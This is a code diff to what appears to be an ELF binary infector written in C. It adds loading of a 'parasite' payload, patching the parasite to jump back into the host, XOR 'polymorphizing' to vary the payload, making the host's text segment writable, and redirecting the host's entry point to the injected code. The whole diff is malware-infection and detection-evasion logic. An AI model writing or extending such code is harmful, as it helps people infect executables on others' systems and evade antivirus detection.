@@ -3,8 +3,11 @@
 int elfit32(opts_t *opts)
 {
     Elfit_t host;
+    Elfit_t parasite;
     uint32_t malpoint;
     uint32_t patch_pos;
+
+    printf("[debug] decided to use 32bit infection\n");
 
     if (opts->cross_infect)
     {
@@ -26,6 +29,7 @@ int elfit32(opts_t *opts)
     patch_pos = opts->patch_pos;
     
     load_host(opts->host, &host);
+    load_host(opts->parasite, &parasite);
 
     if (opts->textpadding)
     {
@@ -94,6 +98,7 @@ int elfit32(opts_t *opts)
 int elfit64(opts_t *opts)
 {
     Elfit_t host;
+    Elfit_t parasite;
     uint64_t malpoint;
     uint64_t patch_pos;
 
@@ -117,17 +122,48 @@ int elfit64(opts_t *opts)
     patch_pos = opts->patch_pos;
     
     load_host(opts->host, &host);
+    load_host(opts->parasite, &parasite);
 
+    if (opts->patch_addr)
+    {
+        printf("[+ PATCHING PARASITE]\t\tto jump to %08x\n", opts->patch_addr);
+        if (patch_parasite64(&parasite, patch_pos, opts->patch_addr))
+        {
+            printf("out-of-bounds patch position supplied\n");
+            return -1;
+        }
+    }
+    else
+    {
+        printf("parasite patch virtual address required\n");
+        return -1;
+    }
+
+    if (opts->polymorphic_key)
+    {
+        printf("[+ POLYMORPHIZING PARASITE]\twith xor key 0x%0x\n", opts->polymorphic_key);
+        parasite_polymorphize64(&parasite, opts->polymorphic_key);
+    }
+
+    /* If we're injecting to the text segment and we're using polymorphism
+     * we must make the text segment writable */
     if (opts->textpadding)
     {
-        malpoint = textpadding_inject_64(&host, opts->parasite, 
+        malpoint = textpadding_inject_64(&host, &parasite, 
             patch_pos, opts->patch_addr);
-
+        reload_host(opts->host, &host);
+        if(opts->polymorphic_key)
+        {
+            printf("[+ TEXT_SEGMENT MOD]\t\tmaking text segment writable for polymorphism\n");
+            make_text_writeable64(&host);
+        }
     } 
     else if (opts->reversepadding)
     {
         printf("chosen injection method not yet implemented\n");
         return -1;
+        if(opts->polymorphic_key)
+            make_text_writeable64(&host);
     } 
     else if (opts->soinject)
     {
@@ -144,6 +180,7 @@ int elfit64(opts_t *opts)
 
     if (opts->entrypoint) 
     {
+        printf("[+ ENTRY_POINT REDIR]\t\tpatching host's entrypoint to 0x%08x\n", malpoint);
         entry_redirect_64(&host, malpoint);
     }
     else if (opts->gottable)
